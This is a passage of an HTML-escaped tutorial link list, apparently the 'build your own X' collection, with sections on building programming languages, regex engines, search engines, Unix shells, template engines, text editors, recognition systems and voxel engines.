&lt;h4&gt;&lt;a id="user-content-build-your-own-programming-language" class="anchor" aria-hidden="true" href="#build-your-own-programming-language"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Build your own &lt;code&gt;Programming Language&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/kanaka/mal#mal---make-a-lisp"&gt;&lt;strong&gt;(any)&lt;/strong&gt;: &lt;em&gt;mal - Make a Lisp&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/nornagon/jonesforth/blob/master/jonesforth.S"&gt;&lt;strong&gt;Assembly&lt;/strong&gt;: &lt;em&gt;Jonesforth&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://journal.stuffwithstuff.com/2013/12/08/babys-first-garbage-collector/" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Baby's First Garbage Collector&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.buildyourownlisp.com/" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Build Your Own Lisp: Learn C and build your own programming language in 1000 lines of code&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://maplant.com/gc.html" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Writing a Simple Garbage Collector in C&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/lotabout/write-a-C-interpreter"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;C interpreter that interprets itself.&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/lotabout/Let-s-build-a-compiler"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;A C &amp;amp; x86 version of the "Let's Build a Compiler" by Jack Crenshaw&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://gnuu.org/2009/09/18/writing-your-own-toy-compiler/" rel="nofollow"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;Writing Your Own Toy Compiler Using Flex&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=eF9qWbuQLuw" rel="nofollow"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;How to Create a Compiler&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://llvm.org/docs/tutorial/MyFirstLanguageFrontend/index.html" rel="nofollow"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;Kaleidoscope: Implementing a Language with LLVM&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://fsharpforfunandprofit.com/posts/understanding-parser-combinators/" rel="nofollow"&gt;&lt;strong&gt;F#&lt;/strong&gt;: &lt;em&gt;Understanding Parser Combinators&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=zMJYoYwOCd4" rel="nofollow"&gt;&lt;strong&gt;Elixir&lt;/strong&gt;: &lt;em&gt;Demystifying compilers by writing your own&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/hazbo/the-super-tiny-compiler"&gt;&lt;strong&gt;Go&lt;/strong&gt;: &lt;em&gt;The Super Tiny Compiler&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=HxaD_trXwRE" rel="nofollow"&gt;&lt;strong&gt;Go&lt;/strong&gt;: &lt;em&gt;Lexical Scanning in Go&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="http://alephnullplex.github.io/cradle/" rel="nofollow"&gt;&lt;strong&gt;Haskell&lt;/strong&gt;: &lt;em&gt;Let's Build a Compiler&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://dev.stephendiehl.com/fun/" rel="nofollow"&gt;&lt;strong&gt;Haskell&lt;/strong&gt;: &lt;em&gt;Write You a Haskell&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikibooks.org/wiki/Write_Yourself_a_Scheme_in_48_Hours" rel="nofollow"&gt;&lt;strong&gt;Haskell&lt;/strong&gt;: &lt;em&gt;Write Yourself a Scheme in 48 Hours&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.wespiser.com/writings/wyas/home.html" rel="nofollow"&gt;&lt;strong&gt;Haskell&lt;/strong&gt;: &lt;em&gt;Write You A Scheme&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.craftinginterpreters.com/" rel="nofollow"&gt;&lt;strong&gt;Java&lt;/strong&gt;: &lt;em&gt;Crafting interpreters: A handbook for making programming languages&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://jakubdziworski.github.io/categories.html#Enkel-ref" rel="nofollow"&gt;&lt;strong&gt;Java&lt;/strong&gt;: &lt;em&gt;Creating JVM Language&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jamiebuilds/the-super-tiny-compiler"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;The Super Tiny Compiler&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/keyanzhang/the-super-tiny-interpreter"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;The Super Tiny Interpreter&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://maryrosecook.com/blog/post/little-lisp-interpreter" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Little Lisp interpreter&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://lisperator.net/pltut/" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;How to implement a programming language in JavaScript&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://norasandler.com/2017/11/29/Write-a-Compiler.html" rel="nofollow"&gt;&lt;strong&gt;OCaml&lt;/strong&gt;: &lt;em&gt;Writing a C Compiler&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://bernsteinbear.com/blog/lisp/" rel="nofollow"&gt;&lt;strong&gt;OCaml&lt;/strong&gt;: &lt;em&gt;Writing a Lisp, the series&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://compilers.iecc.com/crenshaw/" rel="nofollow"&gt;&lt;strong&gt;Pascal&lt;/strong&gt;: &lt;em&gt;Let's Build a Compiler&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://aosabook.org/en/500L/a-python-interpreter-written-in-python.html" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;A Python Interpreter Written in Python&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://khamidou.com/compilers/lisp.py/" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;lisp.py: Make your own Lisp interpreter&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://effbot.org/zone/simple-iterator-parser.htm" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Simple Iterator-based Parsing&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://effbot.org/zone/simple-top-down-parsing.htm" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Simple Top-Down Parsing in Python&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://norvig.com/lispy.html" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;How to Write a Lisp Interpreter in Python&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://ruslanspivak.com/lsbasi-part1/" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Let’s Build A Simple Interpreter&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=dj9CBS3ikGA&amp;amp;list=PLZQftyCk7_SdoVexSmwy_tBgs7P0b97yD&amp;amp;index=1" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Make Your Own Simple Interpreted Programming Language&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://beautifulracket.com/" rel="nofollow"&gt;&lt;strong&gt;Racket&lt;/strong&gt;: &lt;em&gt;Beautiful Racket: How to make your own programming languages with Racket&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.destroyallsoftware.com/screencasts/catalog/a-compiler-from-scratch" rel="nofollow"&gt;&lt;strong&gt;Ruby&lt;/strong&gt;: &lt;em&gt;A Compiler From Scratch&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.beezwax.net/2017/07/07/writing-a-markdown-compiler/" rel="nofollow"&gt;&lt;strong&gt;Ruby&lt;/strong&gt;: &lt;em&gt;Markdown compiler from scratch in Ruby&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.subnetzero.io/post/building-language-vm-part-00/" rel="nofollow"&gt;&lt;strong&gt;Rust&lt;/strong&gt;: &lt;em&gt;So You Want to Build a Language VM&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://bodil.lol/parser-combinators/" rel="nofollow"&gt;&lt;strong&gt;Rust&lt;/strong&gt;: &lt;em&gt;Learning Parser Combinators With Rust&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.uraimo.com/2017/02/05/building-a-lisp-from-scratch-with-swift/" rel="nofollow"&gt;&lt;strong&gt;Swift&lt;/strong&gt;: &lt;em&gt;Building a LISP from scratch with Swift&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.scottlogic.com/2019/05/17/webassembly-compiler.html" rel="nofollow"&gt;&lt;strong&gt;TypeScript&lt;/strong&gt;: &lt;em&gt;Build your own WebAssembly Compiler&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-build-your-own-regex-engine" class="anchor" aria-hidden="true" href="#build-your-own-regex-engine"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Build your own &lt;code&gt;Regex Engine&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.cs.princeton.edu/courses/archive/spr09/cos333/beautiful.html" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;A Regular Expression Matcher&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://swtch.com/~rsc/regexp/regexp1.html" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Regular Expression Matching Can Be Simple And Fast&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://nickdrane.com/build-your-own-regex/" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Build a Regex Engine in Less than 40 Lines of Code&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://dpk.io/dregs/toydregs" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;How to implement regular expressions in functional javascript using derivatives&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://perl.plover.com/Regex/article.html" rel="nofollow"&gt;&lt;strong&gt;Perl&lt;/strong&gt;: &lt;em&gt;How Regexes Work&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://rcoh.svbtle.com/no-magic-regular-expressions" rel="nofollow"&gt;&lt;strong&gt;Scala&lt;/strong&gt;: &lt;em&gt;No Magic: Regular Expressions&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-build-your-own-search-engine" class="anchor" aria-hidden="true" href="#build-your-own-search-engine"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Build your own &lt;code&gt;Search Engine&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://stories.algolia.com/a-search-engine-in-css-b5ec4e902e97" rel="nofollow"&gt;&lt;strong&gt;CSS&lt;/strong&gt;: &lt;em&gt;A search engine in CSS&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.dr-josiah.com/2010/07/building-search-engine-using-redis-and.html" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Building a search engine using Redis and redis-py&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://boyter.org/2010/08/build-vector-space-search-engine-python/" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Building a Vector Space Indexing Engine in Python&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=cY7pE7vX6MU" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Building A Python-Based Search Engine&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/filament-ai/making-text-search-learn-from-feedback-4fe210fd87b0" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Making text search learn from feedback&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://stevenloria.com/tf-idf/" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Finding Important Words in Text Using TF-IDF&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-build-your-own-shell" class="anchor" aria-hidden="true" href="#build-your-own-shell"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Build your own &lt;code&gt;Shell&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://brennan.io/2015/01/16/write-a-shell-in-c/" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Tutorial - Write a Shell in C&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/kamalmarhubi/shell-workshop"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Let's build a shell!&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://indradhanush.github.io/blog/writing-a-unix-shell-part-1/" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Writing a UNIX Shell&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/tokenrove/build-your-own-shell"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Build Your Own Shell&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://sj14.gitlab.io/post/2018-07-01-go-unix-shell/" rel="nofollow"&gt;&lt;strong&gt;Go&lt;/strong&gt;: &lt;em&gt;Writing a simple shell in Go&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.jstorimer.com/blogs/workingwithcode/7766107-a-unix-shell-in-ruby" rel="nofollow"&gt;&lt;strong&gt;Ruby&lt;/strong&gt;: &lt;em&gt;A Unix Shell in Ruby&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.joshmcguigan.com/blog/build-your-own-shell-rust/" rel="nofollow"&gt;&lt;strong&gt;Rust&lt;/strong&gt;: &lt;em&gt;Build Your Own Shell using Rust&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-build-your-own-template-engine" class="anchor" aria-hidden="true" href="#build-your-own-template-engine"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Build your own &lt;code&gt;Template Engine&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://krasimirtsonev.com/blog/article/Javascript-template-engine-in-just-20-line" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;JavaScript template engine in just 20 lines&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/wdstack/understanding-javascript-micro-templating-f37a37b3b40e" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Understanding JavaScript Micro-Templating&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://alexmic.net/building-a-template-engine/" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Approach: Building a toy template engine in Python&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://aosabook.org/en/500L/a-template-engine.html" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;A Template Engine&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://bits.citrusbyte.com/how-to-write-a-template-library/" rel="nofollow"&gt;&lt;strong&gt;Ruby&lt;/strong&gt;: &lt;em&gt;How to write a template engine in less than 30 lines of code&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-build-your-own-text-editor" class="anchor" aria-hidden="true" href="#build-your-own-text-editor"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Build your own &lt;code&gt;Text Editor&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://viewsourcecode.org/snaptoken/kilo/" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Build Your Own Text Editor&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.fltk.org/doc-1.1/editor.html" rel="nofollow"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;Designing a Simple Text Editor&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=xqDonHEYPgA" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Python Tutorial: Make Your Own Text Editor&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.instructables.com/id/Create-a-Simple-Python-Text-Editor/" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Create a Simple Python Text Editor!&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.aha.io/text-editor/" rel="nofollow"&gt;&lt;strong&gt;Ruby&lt;/strong&gt;: &lt;em&gt;Build a Collaborative Text Editor Using Rails&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-build-your-own-visual-recognition-system" class="anchor" aria-hidden="true" href="#build-your-own-visual-recognition-system"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Build your own &lt;code&gt;Visual Recognition System&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.devcenter.co/developing-a-license-plate-recognition-system-with-machine-learning-in-python-787833569ccd" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Developing a License Plate Recognition System with Machine Learning in Python&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://hackernoon.com/building-a-facial-recognition-pipeline-with-deep-learning-in-tensorflow-66e7645015b8" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Building a Facial Recognition Pipeline with Deep Learning in Tensorflow&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-build-your-own-voxel-engine" class="anchor" aria-hidden="true" href="#build-your-own-voxel-engine"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Build your own &lt;code&gt;Voxel Engine&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://sites.google.com/site/letsmakeavoxelengine/home" rel="nofollow"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;Let's Make a Voxel Engine&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=C_Fo9PcrVXA&amp;amp;list=PLXa65xzz2vplye7cn1HH4GyE6_FjnDSug&amp;amp;index=1" rel="nofollow"&gt;&lt;strong&gt;Java&lt;/strong&gt;: &lt;em&gt;Let's make a voxel engine&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=QZ4Vk2PkPZk&amp;amp;list=PL80Zqpd23vJfyWQi-8FKDbeO_ZQamLKJL" rel="nofollow"&gt;&lt;strong&gt;Java&lt;/strong&gt;: &lt;em&gt;Java Voxel Engine Tutorial&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-build-your-own-web-search-engine" class="anchor" aria-hidden="true" href="#build-your-own-web-search-engine"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Build your own &lt;code&gt;Web Search Engine&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://boyter.org/2013/01/code-for-a-search-engine-in-php-part-1/" rel="nofollow"&gt;&lt;strong&gt;PHP&lt;/strong&gt;: &lt;em&gt;Code a Search Engine in PHP&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
